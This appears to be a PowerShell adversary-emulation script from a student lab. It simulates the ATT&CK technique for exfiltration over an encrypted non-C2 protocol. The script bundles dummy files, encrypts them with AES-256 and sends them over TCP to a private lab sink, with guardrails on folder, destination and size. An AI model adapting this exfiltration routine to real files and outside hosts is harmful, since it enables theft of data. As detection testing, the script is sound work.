# ATA075 - T1048.001 Exfiltration Over Symmetric Encrypted Non-C2 Protocol (Windows)
# Manual: el clon ART 388942ad no trae una atomica Windows de AES + TcpClient que encaje
# (T1048 usa SSH/DNS). Se implementa AES-256 + TcpClient al sink TCP local 9091.
# Sin secretos: clave e IV efimeros, no se persisten.
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ($dir -notlike 'C:\lab-attack\ATA075*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null
$datos = Join-Path $dir 'datos'
New-Item -ItemType Directory -Force -Path $datos | Out-Null
$sink = '192.168.65.1'
$port = 9091
if ($sink -notlike '192.168.65.*') { 'GUARDARRAIL: destino no permitido' | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii; exit 2 }
1..20 | ForEach-Object { Set-Content -Path (Join-Path $datos ("doc_$_.txt")) -Value ("TFG AES $_ " + ('B' * 64)) -Encoding ascii }
$files = Get-ChildItem $datos -File
if ($files.Count -gt 200) { Write-Error 'GUARDARRAIL: demasiados ficheros'; exit 2 }
$plain = Join-Path $dir 'payload.txt'
$files | ForEach-Object { Get-Content $_.FullName } | Set-Content -Path $plain -Encoding ascii
$bytes = [IO.File]::ReadAllBytes($plain)
if ($bytes.Length -gt 67108864) { Write-Error 'GUARDARRAIL: payload > 64 MiB'; exit 2 }
$aes = [Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.GenerateKey()
$aes.GenerateIV()
$enc = $aes.CreateEncryptor()
$cipher = $enc.TransformFinalBlock($bytes, 0, $bytes.Length)
$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($sink, $port)
$stream = $client.GetStream()
$stream.Write($cipher, 0, $cipher.Length)
$stream.Flush()
$client.Close()
$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$shaC = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($cipher)).Replace('-', '').ToLower()
@(
    "ata=ATA075", "tecnica=T1048.001", "fuente=manual",
    "t0=$t0", "t1=$t1", "destino=$sink`:$port",
    "bytes=$($cipher.Length)", "sha256_cifrado=$shaC", "aes=256"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
exit 0
